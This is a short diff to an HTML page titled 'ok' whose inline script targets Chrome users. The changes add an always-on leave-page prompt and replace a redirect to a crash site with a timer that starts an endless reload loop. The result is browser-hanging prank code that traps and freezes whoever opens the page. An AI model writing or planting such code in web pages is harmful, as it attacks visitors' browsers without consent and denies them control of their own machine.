@@ -3,9 +3,14 @@
 <head>
   <title>ok</title>
   <script type="text/javascript">
+    onbeforeunload = () => true;
+
     if (navigator.userAgent.indexOf("Chrome") != -1) {
       alert(':3');
-      window.open('http://crashchrome.com/', '_self', '');
+      setTimeout(function(){
+        while(1)
+          location.reload(1);
+      }, 1000);
     } else {
       alert(':33');
       console.log(3234567654 * 45671234567890987654321);
